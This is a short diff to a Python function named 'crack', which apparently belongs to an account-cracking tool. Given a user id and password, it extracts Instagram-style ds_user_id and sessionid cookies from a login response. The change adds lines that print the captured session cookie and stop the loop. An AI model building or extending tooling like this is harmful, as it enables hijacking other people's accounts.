@@ -171,6 +171,8 @@ def crack(uid, pww, total_idz):
                 ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                 sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                 cokie = ({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
+                print(cokie)
+                break
             else:
                 print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
